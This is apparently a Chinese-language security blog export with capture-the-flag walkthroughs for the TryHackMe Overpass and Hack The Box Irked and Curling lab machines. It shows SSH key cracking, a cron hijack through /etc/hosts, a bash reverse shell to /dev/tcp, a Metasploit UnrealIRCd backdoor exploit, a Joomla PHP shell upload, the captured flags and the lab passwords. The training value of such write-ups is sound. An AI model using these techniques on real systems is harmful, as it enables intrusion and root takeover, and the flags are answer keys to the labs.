WDyy8qncljugOIf8QrHoo30Gv+dAMfipTSR43FGBZ/Hha4jDykUXP0PvuFyTbVdv BMXmr3xuKkB6I6k/jLjqWcLrhPWS0qRJ718G/u8cqYX3oJmM0Oo3jgoXYXxewGSZ AL5bLQFhZJNGoZ+N5nHOll1OBl1tmsUIRwYK7wT/9kvUiL3rhkBURhVIbj2qiHxR 3KwmS4Dm4AOtoPTIAmVyaKmCWopf6le1+wzZ/UprNCAgeGTlZKX/joruW7ZJuAUf ABbRLLwFVPMgahrBp6vRfNECSxztbFmXPoVwvWRQ98Z+p8MiOoReb7Jfusy6GvZk VfW2gpmkAr8yDQynUukoWexPeDHWiSlg1kRJKrQP7GCupvW/r/Yc1RmNTfzT5eeR OkUOTMqmd3Lj07yELyavlBHrz5FJvzPM3rimRwEsl8GH111D4L5rAKVcusdFcg8P 9BQukWbzVZHbaQtAGVGy0FKJv1WhA+pjTLqwU+c15WF7ENb3Dm5qdUoSSlPzRjze eaPG5O4U9Fq0ZaYPkMlyJCzRVp43De4KKkyO5FQ+xSxce3FW0b63+8REgYirOGcZ 4TBApY+uz34JXe8jElhrKV9xw/7zG2LokKMnljG2YFIApr99nZFVZs1XOFCCkcM8 GFheoT4yFwrXhU1fjQjW/cR0kbhOv7RfV5x7L36x3ZuCfBdlWkt/h2M5nowjcbYn exxOuOdqdazTjrXOyRNyOtYF9WPLhLRHapBAkXzvNSOERB3TJca8ydbKsyasdCGy AIPX52bioBlDhg8DmPApR1C1zRYwT1LEFKt7KKAaogbw3G5raSzB54MQpX6WL+wk 6p7/wOX6WMo1MlkF95M3C7dxPFEspLHfpBxf2qys9MqBsd0rLkXoYR6gpbGbAW58 dPm51MekHD+WeP8oTYGI4PVCS/WF+U90Gty0UmgyI9qfxMVIu1BcmJhzh8gdtT0i n0Lz5pKY+rLxdUaAA9KVwFsdiXnXjHEE1UwnDqqrvgBuvX6Nux+hfgXi9Bsy68qT 8HiUKTEsukcv/IYHK1s+Uw/H5AWtJsFmWQs3bw+Y4iw+YLZomXA4E7yxPXyfWm4K 4FMg3ng0e4/7HRYJSaXLQOKeNwcf/LW5dipO7DmBjVLsC8eyJ8ujeutP/GcA5l6z ylqilOgj4+yiS813kNTjCJOwKRsXg2jKbnRa8b7dSRz7aDZVLpJnEy9bhn6a7WtS 49TxToi53ZB14+ougkL4svJyYYIRuQjrUmierXAdmbYF9wimhmLfelrMcofOHRW2 +hL1kHlTtJZU8Zj2Y2Y3hd6yRNJcIgCDrmLbn9C5M0d7g0h2BlFaJIZOYDS6J6Yk 2cWk/Mln7+OhAApAvDBKVM7/LGR9/sVPceEos6HTfBXbmsiV+eoFzUtujtymv8U7 -----END RSA PRIVATE KEY----- 将 sshkey 保存到 id_rsa 中，并给予权限 chmod 600 id_rsa 接着使用 ssh 进行登陆 ┌──(root💀lucifiel)-[~/Desktop] └─# ssh james@10.10.84.23 -i id_rsa The authenticity of host &#39;10.10.84.23 (10.10.84.23)&#39; can&#39;t be established. ECDSA key fingerprint is SHA256:4P0PNh/u8bKjshfc6DBYwWnjk1Txh5laY/WbVPrCUdY. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added &#39;10.10.84.23&#39; (ECDSA) to the list of known hosts. Enter passphrase for key &#39;id_rsa&#39;: 显示需要输入密码，去破解一下 ┌──(root💀lucifiel)-[~/Desktop] └─# ssh2john id_rsa &gt; hash ┌──(root💀lucifiel)-[~/Desktop] └─# cat hash id_rsa:$sshng$1$16$9F85D92F34F42626F13A7493AB48F337$1200$2cdbb9c10041cfba4a67771ce135a5c4852e0ffa29262d435693dad3aa708871e17bc663c37feffb19e6b52dcefaa88d2479cb4bca14551e929a8b30e29a8b19c3f70302afaf30d6b70db270eee635d36ccf02e9deeb68ec435d4c86f3bc96a5ef7fde50df64605d2e6bdad90ba9b0a08da21bab1d94d2f866ab1863baebbc3c5e099264833406ce407dc0a830d658d3583cb2f2a9dc963ba03887fc42b1e8a37d06bfe74031f8a94d2478dc518167f1e16b88c3ca45173f43efb85c936d576f04c5e6af7c6e2a407a23a93f8cb8ea59c2eb84f592d2a449ef5f06feef1ca985f7a0998cd0ea378e0a17617c5ec0649900be5b2d0161649346a19f8de671ce965d4e065d6d9ac50847060aef04fff64bd488bdeb8640544615486e3daa887c51dcac264b80e6e003ada0f4c802657268a9825a8a5fea57b5fb0cd9fd4a6b3420207864e564a5ff8e8aee5bb649b8051f0016d12cbc0554f3206a1ac1a7abd17cd1024b1ced6c59973e8570bd6450f7c67ea7c3223a845e6fb25fbaccba1af66455f5b68299a402bf320d0ca752e92859ec4f7831d6892960d644492ab40fec60aea6f5bfaff61cd5198d4dfcd3e5e7913a450e4ccaa67772e3d3bc842f26af9411ebcf9149bf33ccdeb8a647012c97c187d75d43e0be6b00a55cbac745720f0ff4142e9166f35591db690b401951b2d05289bf55a103ea634cbab053e735e5617b10d6f70e6e6a754a124a53f3463cde79a3c6e4ee14f45ab465a60f90c972242cd1569e370dee0a2a4c8ee4543ec52c5c7b7156d1beb7fbc4448188ab386719e13040a58faecf7e095def2312586b295f71c3fef31b62e890a3279631b6605200a6bf7d9d915566cd5738508291c33c18585ea13e32170ad7854d5f8d08d6fdc47491b84ebfb45f579c7b2f7eb1dd9b827c17655a4b7f8763399e8c2371b6277b1c4eb8e76a75acd38eb5cec913723ad605f563cb84b4476a9040917cef352384441dd325c6bcc9d6cab326ac7421b20083d7e766e2a01943860f0398f0294750b5cd16304f52c414ab7b28a01aa206f0dc6e6b692cc1e78310a57e962fec24ea9effc0e5fa58ca35325905f793370bb7713c512ca4b1dfa41c5fdaacacf4ca81b1dd2b2e45e8611ea0a5b19b016e7c74f9b9d4c7a41c3f9678ff284d8188e0f5424bf585f94f741adcb452683223da9fc4c548bb505c98987387c81db53d229f42f3e69298fab2f175468003d295c05b1d8979d78c7104d54c270eaaabbe006ebd7e8dbb1fa17e05e2f41b32ebca93f0789429312cba472ffc86072b5b3e530fc7e405ad26c166590b376f0f98e22c3e60b66899703813bcb13d7c9f5a6e0ae05320de78347b8ffb1d160949a5cb40e29e37071ffcb5b9762a4eec39818d52ec0bc7b227cba37aeb4ffc6700e65eb3ca5aa294e823e3eca24bcd7790d4e30893b0291b178368ca6e745af1bedd491cfb6836552e9267132f5b867e9aed6b52e3d4f14e88b9dd9075e3ea2e8242f8b2f272618211b908eb52689ead701d99b605f708a68662df7a5acc7287ce1d15b6fa12f5907953b49654f198f663663785deb244d25c220083ae62db9fd0b933477b83487606515a24864e6034ba27a624d9c5a4fcc967efe3a1000a40bc304a54ceff2c647dfec54f71e128b3a1d37c15db9ac895f9ea05cd4b6e8edca6bfc53b 然后使用 john 进行爆破 ┌──(root💀lucifiel)-[~/Desktop] └─# john --wordlist=/usr/share/wordlists/rockyou.txt hash 1 ⨯ Using default input encoding: UTF-8 Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64]) Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes Cost 2 (iteration count) is 1 for all loaded hashes Will run 2 OpenMP threads Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status james13 (id_rsa) 1g 0:00:00:00 DONE (2022-05-05 20:27) 12.50g/s 167200p/s 167200c/s 167200C/s lisa..honolulu Use the &quot;--show&quot; option to display all of the cracked passwords reliably Session completed. 这里爆破出来了密码为 james13 去就进行连接 ┌──(root💀lucifiel)-[~/Desktop] └─# ssh james@10.10.84.23 -i id_rsa Enter passphrase for key &#39;id_rsa&#39;: Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-108-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Thu May 5 12:32:51 UTC 2022 System load: 0.09 Processes: 92 Usage of /: 22.3% of 18.57GB Users logged in: 0 Memory usage: 12% IP address for eth0: 10.10.84.23 Swap usage: 0% 47 packages can be updated. 0 updates are security updates. Last login: Sat Jun 27 04:45:40 2020 from 192.168.170.1 james@overpass-prod:~$ whoami&amp;&amp;id james uid=1001(james) gid=1001(james) groups=1001(james) 成功拿到 user 权限 james@overpass-prod:~$ ls todo.txt user.txt james@overpass-prod:~$ cat user.txt thm{65c1aaf000506e56996822c6281e6bf7} 成功拿到 user 权限的 flag 文件 权限提升james@overpass-prod:~$ cat todo.txt To Do: &gt; Update Overpass&#39; Encryption, Muirland has been complaining that it&#39;s not strong enough &gt; Write down my password somewhere on a sticky note so that I don&#39;t forget it. Wait, we make a password manager. Why don&#39;t I just use that? &gt; Test Overpass for macOS, it builds fine but I&#39;m not sure it actually works &gt; Ask Paradox how he got the automated build script working and where the builds go. They&#39;re not updating on the website 这有个 todo.txt 文件作为提示，不过我英语不好，也不确定说的啥，还是先跑个 LinPeas 看看吧 SHELL=/bin/sh PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin 17 * * * * root cd / &amp;&amp; run-parts --report /etc/cron.hourly 25 6 * * * root test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily ) 47 6 * * 7 root test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly ) 52 6 1 * * root test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly ) * * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash 这里看到一个，root 会使用 curl 向 overpass.htm&#x2F;downloads&#x2F;src&#x2F;buildscrit.sh 请求内容，然后使用 bash 执行 ╔══════════╣ Hostname, hosts and DNS overpass-prod 127.0.0.1 localhost 127.0.1.1 overpass-prod 127.0.0.1 overpass.thm ::1 ip6-localhost ip6-loopback fe00::0 ip6-localnet ff00::0 ip6-mcastprefix ff02::1 ip6-allnodes ff02::2 ip6-allrouters nameserver 127.0.0.53 options edns0 search eu-west-1.compute.internal 然后在这里可以看到 overpass.htm 是指向的 127.0.0.1 james@overpass-prod:~$ ls -la /etc/hosts -rw-rw-rw- 1 root root 250 Jun 27 2020 /etc/hosts 这里可以看到，我们是有权限修改 &#x2F;etc&#x2F;hosts 的内容的 那提权思路就有了 首先创建指定的目录和脚本 mkdir -p downloads/src &amp;&amp; vim downloads/src/buildscript.sh 然后写入我们的 payload bash -c &#39;exec bash -i &amp;&gt;/dev/tcp/10.18.112.117/4444 &lt;&amp;1&#39; 接着需要两个窗口 第一个窗口 使用 nc 监听一个端口 nc -nvlp 4444 第二个窗口 使用 python3 开启一个 http 服务 python3 -m http.server 80 然后去 shell 里修改 &#x2F;etc&#x2F;hosts 的内容 10.18.112.117 overpass.thm 把第三行改成这样，然后等着就行了 ┌──(root💀kali)-[~/Desktop] └─# python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 10.10.84.23 - - [05/May/2022 09:17:01] &quot;GET /downloads/src/buildscript.sh HTTP/1.1&quot; 200 - 成功下载了我们的 payload ┌──(root💀kali)-[~/Desktop] └─# nc -nvlp 4444 listening on [any] 4444 ... connect to [10.18.112.117] from (UNKNOWN) [10.10.84.23] 43604 bash: cannot set terminal process group (16146): Inappropriate ioctl for device bash: no job control in this shell root@overpass-prod:~# whoami&amp;&amp;id whoami&amp;&amp;id root uid=0(root) gid=0(root) groups=0(root) 成功拿到了 root 权限 root@overpass-prod:~# ls ls buildStatus builds downloads go root.txt src root@overpass-prod:~# cat root.txt cat root.txt thm{7f336f8c359dbac18d54fdd64ea753bb} 成功拿到了 root 权限的 flag 文件","categories":[],"tags":[{"name":"TryHackMe","slug":"TryHackMe","permalink":"http://www.lucifiel.com/tags/TryHackMe/"}]},{"title":"Irked - Hackthebox","slug":"Hackthebox/Easy/Hackthebox-Irked","date":"2022-04-29T11:38:36.000Z","updated":"2023-06-13T03:45:08.000Z","comments":true,"path":"2022/04/29/Hackthebox/Easy/Hackthebox-Irked/","link":"","permalink":"http://www.lucifiel.com/2022/04/29/Hackthebox/Easy/Hackthebox-Irked/","excerpt":"","text":"Hackthebox - Irked靶场信息 靶场类型 信息收集Nmap┌──(root💀lucifiel)-[~/Desktop] └─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.117 1 ⚙ Starting Nmap 7.91 ( https://nmap.org ) at 2022-04-29 10:23 CST Nmap scan report for 10.10.10.117 Host is up (0.17s latency). Not shown: 65528 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0) | ssh-hostkey: | 1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA) | 2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA) | 256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA) |_ 256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519) 80/tcp open http Apache httpd 2.4.10 ((Debian)) |_http-server-header: Apache/2.4.10 (Debian) |_http-title: Site doesn&#39;t have a title (text/html). 111/tcp open rpcbind 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/udp rpcbind | 100000 3,4 111/tcp6 rpcbind | 100000 3,4 111/udp6 rpcbind | 100024 1 49297/tcp status | 100024 1 50541/udp status | 100024 1 51791/udp6 status |_ 100024 1 60368/tcp6 status 6697/tcp open irc UnrealIRCd 8067/tcp open irc UnrealIRCd 49297/tcp open status 1 (RPC #100024) 65534/tcp open irc UnrealIRCd No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.91%E=4%D=4/29%OT=22%CT=1%CU=32566%PV=Y%DS=2%DC=T%G=Y%TM=626B4C5 OS:E%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=109%TI=Z%CI=I%II=I%TS=8)OPS OS:(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST1 OS:1NW7%O6=M505ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN OS:(R=Y%DF=Y%T=40%W=7210%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N% OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD OS:=S) Network Distance: 2 hops Service Info: Host: irked.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 143/tcp) HOP RTT ADDRESS 1 170.14 ms 10.10.14.1 2 170.23 ms 10.10.10.117 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 47.84 seconds 这边有一个 111 端口，看着像是 rpcbind 方面的漏洞，好像是缓冲区溢出相关的，使用 msf 检查试试 Metasploitmsf6 auxiliary(scanner/misc/sunrpc_portmapper) &gt; show options Module options (auxiliary/scanner/misc/sunrpc_portmapper): Name Current Setting Required Description ---- --------------- -------- ----------- PROTOCOL tcp yes Protocol to use (Accepted: tcp, udp) RHOSTS 10.10.10.117 yes The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39; RPORT 111 yes The target port (TCP) THREADS 1 yes The number of concurrent threads (max one per host) 设置好后去执行 msf6 auxiliary(scanner/misc/sunrpc_portmapper) &gt; exploit [+] 10.10.10.117:111 - SunRPC Programs for 10.10.10.117 ================================ Name Number Version Port Protocol ---- ------ ------- ---- -------- rpcbind 100000 4 111 tcp rpcbind 100000 3 111 tcp rpcbind 100000 2 111 tcp rpcbind 100000 4 111 udp rpcbind 100000 3 111 udp rpcbind 100000 2 111 udp status 100024 1 50541 udp status 100024 1 49297 tcp [*] 10.10.10.117:111 - Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed 扫描到了，但是无法利用成功，换个其他地方继续看 HTTP Web 服务提示 IRC 可以正常工作，这里 6697、8067、65534 似乎都是 IRC 服务，去搜索一下 IRC 是什么东西 搜索 WIKI 发现，IRC 是一种应用层的协议，主要用于群体聊天，通常使用的端口是 6667 和 6697，正好我们这里有 6697 漏洞利用msf6 &gt; search Unreal Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/linux/games/ut2004_secure 2004-06-18 good Yes Unreal Tournament 2004 &quot;secure&quot; Overflow (Linux) 1 exploit/windows/games/ut2004_secure 2004-06-18 good Yes Unreal Tournament 2004 &quot;secure&quot; Overflow (Win32) 2 exploit/unix/irc/unreal_ircd_3281_backdoor 2010-06-12 excellent No UnrealIRCD 3.2.8.1 Backdoor Command Execution Interact with a module by name or index. For example info 2, use 2 or use exploit/unix/irc/unreal_ircd_3281_backdoor 使用 msf 搜到了一个脚本，去使用一下 msf6 &gt; use 2 msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) &gt; show options Module options (exploit/unix/irc/unreal_ircd_3281_backdoor): Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS yes The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39; RPORT 6667 yes The target port (TCP) Exploit target: Id Name -- ---- 0 Automatic Target 设置好 RHOSTS，然后执行 msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) &gt; set payload cmd/unix/reverse payload =&gt; cmd/unix/reverse msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) &gt; set rhosts 10.10.10.117 rhosts =&gt; 10.10.10.117 msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) &gt; set lhost 10.10.16.12 lhost =&gt; 10.10.16.12 msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) &gt; set rport 6697 rport =&gt; 6697 msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) &gt; exploit [*] Started reverse TCP double handler on 10.10.16.12:4444 [*] 10.10.10.117:6697 - Connected to 10.10.10.117:6697... :irked.htb NOTICE AUTH :*** Looking up your hostname... [*] 10.10.10.117:6697 - Sending backdoor command... [*] Accepted the first client connection... [*] Accepted the second client connection... [*] Command: echo SUUjSBbQaAoSC5R9; [*] Writing to socket A [*] Writing to socket B [*] Reading from sockets... [*] Reading from socket B [*] B: &quot;SUUjSBbQaAoSC5R9\\r\\n&quot; [*] Matching... [*] A is input... [*] Command shell session 1 opened (10.10.16.12:4444 -&gt; 10.10.10.117:51640) at 2022-04-28 22:55:02 -0400 whoami&amp;&amp;id ircd uid=1001(ircd) gid=1001(ircd) groups=1001(ircd) 接着使用 shell 进入 shell 模式 shell python3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot; ircd@irked:/home/djmardov/Documents$ ls -la ls -la total 16 drwxr-xr-x 2 djmardov djmardov 4096 May 15 2018 . drwxr-xr-x 18 djmardov djmardov 4096 Nov 3 2018 .. -rw-r--r-- 1 djmardov djmardov 52 May 16 2018 .backup -rw------- 1 djmardov djmardov 33 May 15 2018 user.txt 有点奇怪，明明是 Linux 系统，djmardov 用户目录却是 Windows 的系统结构 在目录 &#x2F;home&#x2F;djmardov&#x2F;Documents 中找到了 user.txt flag 文件，但是我们权限不够，还有一个 .backup 文件，我们有查看权限，看一下是什么 权限提升Userircd@irked:/home/djmardov/Documents$ cat .backup cat .backup Super elite steg backup pw UPupDOWNdownLRlrBAbaSSss 我直接拿着这段密码去登录 djmardov 账户是不行的，提示失败 然后看着提示，这似乎是一段 steg 的编码，而我们又没有要解密的文件，这时候我想起来，密码一般会藏在哪？当然是图片里，而哪里有图片呢？HTTP 服务的主页有一张图片！ ┌──(root💀kali)-[~/Desktop] └─# steghide extract -sf irked.jpg 1 ⨯ Enter passphrase: wrote extracted data to &quot;pass.txt&quot;. 在这提示我们输入密码，刚才 .backup 里的密码就有用处了，输入密码后解压出来一个 pass.txt 文件 ┌──(root💀kali)-[~/Desktop] └─# cat pass.txt Kab6h+m+bbp2J:HG 得到了密码 ┌──(root💀kali)-[~/Desktop] └─# ssh djmardov@10.10.10.117 djmardov@10.10.10.117&#39;s password: The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Thu Apr 28 04:38:52 2022 from 10.10.14.3 djmardov@irked:~$ whoami&amp;&amp;id djmardov uid=1000(djmardov) gid=1000(djmardov) groups=1000(djmardov),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(lpadmin),113(scanner),117(bluetooth) 成功提权到 user 用户 djmardov@irked:~/Documents$ cat user.txt 4a66a78b12dc0e661a59d3f5c0267a8e 成功拿到 user 权限的 flag 文件 权限提升djmardov@irked:~$ find / -user root -perm -4000 -print 2&gt;/dev/null /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/eject/dmcrypt-get-device /usr/lib/policykit-1/polkit-agent-helper-1 /usr/lib/openssh/ssh-keysign /usr/lib/spice-gtk/spice-client-glib-usb-acl-helper /usr/sbin/exim4 /usr/sbin/pppd /usr/bin/chsh /usr/bin/procmail /usr/bin/gpasswd /usr/bin/newgrp /usr/bin/pkexec /usr/bin/X /usr/bin/passwd /usr/bin/chfn /usr/bin/viewuser /sbin/mount.nfs /bin/su /bin/mount /bin/fusermount /bin/ntfs-3g /bin/umount 使用 find 查找一下特殊权限文件 找到了一个 &#x2F;usr&#x2F;bin&#x2F;viewuser 文件，查看一下 djmardov@irked:/usr/bin$ ./viewuser This application is being devleoped to set and test user permissions It is still being actively developed (unknown) :0 2022-04-28 02:46 (:0) djmardov pts/5 2022-04-28 23:22 (10.10.16.12) /tmp/listusers: connect: Connection refused 发现这里似乎调用了一个 &#x2F;tmp&#x2F;listusers 向 &#x2F;tmp&#x2F;listusers 写入文件 echo &quot;/bin/sh&quot; &gt; /tmp/listusers 接着执行 &#x2F;usr&#x2F;bin&#x2F;viewuser djmardov@irked:/tmp$ echo &quot;/bin/sh&quot; &gt; /tmp/listusers djmardov@irked:/tmp$ /usr/bin/viewuser This application is being devleoped to set and test user permissions It is still being actively developed (unknown) :0 2022-04-28 02:46 (:0) djmardov pts/5 2022-04-28 23:52 (10.10.16.12) # whoami&amp;&amp;id root uid=0(root) gid=1000(djmardov) groups=1000(djmardov),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(lpadmin),113(scanner),117(bluetooth) 成功提权到 root 权限 # cat /root/root.txt 8d8e9e8be64654b6dccc3bff4522daf3 成功拿到 root 权限的 flag 文件","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Curling - Hackthebox","slug":"Hackthebox/Easy/Hackthebox-Curling","date":"2022-04-28T11:38:36.000Z","updated":"2023-06-13T03:42:42.000Z","comments":true,"path":"2022/04/28/Hackthebox/Easy/Hackthebox-Curling/","link":"","permalink":"http://www.lucifiel.com/2022/04/28/Hackthebox/Easy/Hackthebox-Curling/","excerpt":"","text":"Hackthebox - Curling靶场信息 靶场类型 信息收集Nmap┌──(root💀kali)-[~/Desktop] └─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.150 Starting Nmap 7.91 ( https://nmap.org ) at 2022-04-26 21:40 EDT Nmap scan report for 10.10.10.150 Host is up (0.34s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: |_ 256 c1:2a:35:44:30:0c:5b:56:6a:3f:a5:cc:64:66:d9:a9 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-generator: Joomla! - Open Source Content Management |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Home No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.91%E=4%D=4/26%OT=22%CT=1%CU=41478%PV=Y%DS=2%DC=T%G=Y%TM=62689FB OS:F%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=2%ISR=10B%TI=Z%CI=Z%II=I%TS=C)OPS OS:(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST1 OS:1NW7%O6=M505ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN OS:(R=Y%DF=Y%T=40%W=FAF0%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N% OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD OS:=S) Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 3389/tcp) HOP RTT ADDRESS 1 338.76 ms 10.10.14.1 2 339.30 ms 10.10.10.150 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 175.76 seconds HTTP 这一台似乎是关于冰壶的，到处看了一下，没看到什么突破口，弱口令也没有登入进去，去 Fuzz 一下 Fuzz┌──(root💀kali)-[~/Desktop] └─# gobuster dir -u http://10.10.10.150/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -t 200 --no-error 1 ⨯ =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.150/ [+] Method: GET [+] Threads: 200 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2022/04/27 01:33:22 Starting gobuster in directory enumeration mode =============================================================== /media (Status: 301) [Size: 312] [--&gt; http://10.10.10.150/media/] /templates (Status: 301) [Size: 316] [--&gt; http://10.10.10.150/templates/] /images (Status: 301) [Size: 313] [--&gt; http://10.10.10.150/images/] /modules (Status: 301) [Size: 314] [--&gt; http://10.10.10.150/modules/] /bin (Status: 301) [Size: 310] [--&gt; http://10.10.10.150/bin/] /plugins (Status: 301) [Size: 314] [--&gt; http://10.10.10.150/plugins/] /includes (Status: 301) [Size: 315] [--&gt; http://10.10.10.150/includes/] /language (Status: 301) [Size: 315] [--&gt; http://10.10.10.150/language/] /components (Status: 301) [Size: 317] [--&gt; http://10.10.10.150/components/] /libraries (Status: 301) [Size: 316] [--&gt; http://10.10.10.150/libraries/] /cache (Status: 301) [Size: 312] [--&gt; http://10.10.10.150/cache/] /tmp (Status: 301) [Size: 310] [--&gt; http://10.10.10.150/tmp/] /layouts (Status: 301) [Size: 314] [--&gt; http://10.10.10.150/layouts/] /administrator (Status: 301) [Size: 320] [--&gt; http://10.10.10.150/administrator/] /cli (Status: 301) [Size: 310] [--&gt; http://10.10.10.150/cli/] /server-status (Status: 403) [Size: 277] =============================================================== 2022/04/27 01:59:29 Finished =============================================================== 挨个去看一下 在 &#x2F;administrator 目录下，找到了一个 Joomla，但是不知道版本，搜索了一下 Joomla 也没有默认密码，继续看看 &lt;/body&gt; &lt;!-- secret.txt --&gt; &lt;/html&gt; 在首页的源代码最下面的 359 行发现了一个文件，去查看一下 Q3VybGluZzIwMTgh ┌──(root💀kali)-[~/Desktop] └─# echo Q3VybGluZzIwMTgh|base64 -d Curling2018! 我猜想这应该是一个密码 然后在首页面获取到一个账号 username = Floris password = Curling2018! 登录成功，但这里似乎没什么东西，我们尝试去 Joomla 登录试试 登录成功，东西比较多，到处找找有没有突破口 漏洞利用 选择首页面的 Global → Media → Legal Extensions (File Types) 然后添加上我们要的后缀 php 修改好以后点击 Save&amp;close 接着使用 nc 监听一个端口 nc -nvlp 4444 然后访问 Extensions → Templates → Templates → Beez3 Details and Files 接着添加一个新文件 https://github.com/LucifielHack/php-reverse-shell/blob/master/php-reverse-shell.php 把我们的 reverse-shell.php 给传上去 ┌──(root💀kali)-[~/Desktop] └─# curl http://10.10.10.150/templates/beez3/shell.php 接着请求一下我们的 shell ┌──(root💀kali)-[~/Desktop] └─# nc -nvlp 4444 listening on [any] 4444 ... connect to [10.10.16.12] from (UNKNOWN) [10.10.10.150] 40030 Linux curling 4.15.0-156-generic #163-Ubuntu SMP Thu Aug 19 23:31:58 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux 06:24:26 up 31 min, 0 users, load average: 0.06, 0.01, 0.00 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=33(www-data) gid=33(www-data) groups=33(www-data) bash: cannot set terminal process group (1262): Inappropriate ioctl for device bash: no job control in this shell www-data@curling:/$ 